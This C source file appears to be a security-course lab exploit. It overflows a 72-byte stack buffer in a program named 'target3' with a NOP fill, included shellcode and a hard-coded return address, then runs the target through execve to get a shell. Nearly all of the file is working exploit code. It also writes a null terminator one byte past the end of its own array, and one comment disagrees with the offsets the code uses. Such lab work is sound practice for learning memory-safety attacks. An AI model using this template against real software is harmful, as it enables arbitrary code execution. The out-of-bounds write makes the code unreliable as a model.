#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

//pre-defined constant
//buffer size is 64 from the gdb stepped in 
//64+4 since we need to overwrite the char string "AAAA"
//68+4 bytes including the returned address 
//this is 72 in total 
#define OVERFLOWBUFFER 72
//pre-define no-op to fill the buffer
#define NOP 0x90 

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

        int i;
        int shellsize = strlen(shellcode);//shell code length
        char attacker_str[OVERFLOWBUFFER];// start from 0

        //building attacker string 
        //1.full the buffer with NOP
        for( i=0; i < OVERFLOWBUFFER; i++){
            attacker_str[i] = NOP;
        }

        //copying from shell 
        for ( i=0; i < shellsize; i++){
            attacker_str[i] = shellcode[i];
        }

        //returning the start of the buffer
        *(int*)&attacker_str[68] = 0x2021fe14; //added 8 bytes for "AAAA"
                                                //and space for return address
        //null terminate
        attacker_str[OVERFLOWBUFFER] = '\0';
        
	args[0] = TARGET;
	args[1] = attacker_str;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}

